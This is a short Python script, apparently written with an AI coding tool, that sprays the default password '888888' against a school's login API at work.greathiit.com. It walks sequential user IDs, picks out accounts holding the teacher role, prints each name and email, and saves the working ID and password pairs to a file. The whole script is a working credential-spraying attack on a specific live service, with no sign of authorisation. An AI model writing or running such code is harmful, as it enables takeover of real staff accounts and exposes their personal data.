#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
快速教师账号测试脚本
"""

import requests
import json
import time

def quick_test_teacher(teacher_id, password="888888"):
    """快速测试教师账号"""
    url = "https://work.greathiit.com/api/user/loginWai"
    headers = {'Content-Type': 'application/json'}
    payload = {"userNumber": teacher_id, "password": password, "autoLogin": True, "provider": "account"}
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=3)
        if response.status_code == 200:
            data = response.json()
            if data.get("code") == 0 or (data.get("message") == "ok" and data.get("data")):
                user_info = data.get("data", {})
                name = user_info.get("name", "Unknown")
                email = user_info.get("email", "")
                roles = user_info.get("role", [])
                
                # 检查是否是教师
                if "teacher" in roles:
                    print(f"SUCCESS TEACHER: {teacher_id} - {name} ({email}) - {roles}")
                    return True
                else:
                    print(f"SUCCESS NON-TEACHER: {teacher_id} - {name} - {roles}")
                    return False
    except:
        pass
    return False

def main():
    print("=== Quick Teacher Account Test ===")
    valid_teachers = []
    
    # 测试教师账号关键区间
    print("\nTesting teacher accounts 10001-10050...")
    for i in range(10001, 10051):
        teacher_id = str(i)
        if quick_test_teacher(teacher_id):
            valid_teachers.append(teacher_id)
        time.sleep(0.2)
        
        if len(valid_teachers) >= 10:  # 找到10个教师就够了
            break
    
    # 如果还没找够，继续测试
    if len(valid_teachers) < 10:
        print(f"\nContinue testing 10100-10150... (Current: {len(valid_teachers)})")
        for i in range(10100, 10151):
            teacher_id = str(i)
            if quick_test_teacher(teacher_id):
                valid_teachers.append(teacher_id)
            time.sleep(0.2)
            
            if len(valid_teachers) >= 10:
                break
    
    print(f"\n=== TEACHER RESULTS ===")
    print(f"Total valid teacher accounts found: {len(valid_teachers)}")
    for acc in valid_teachers:
        print(f"  - {acc}")
    
    # 保存结果
    with open("D:\\ClaudeCode\\AI_Web\\teacher_test_results.txt", "w") as f:
        f.write("Quick Teacher Account Test Results\n")
        f.write("=" * 35 + "\n")
        f.write(f"Found {len(valid_teachers)} teacher accounts:\n\n")
        for acc in valid_teachers:
            f.write(f"{acc} / 888888 (teacher role)\n")
    
    print("Results saved to teacher_test_results.txt")

if __name__ == "__main__":
    main()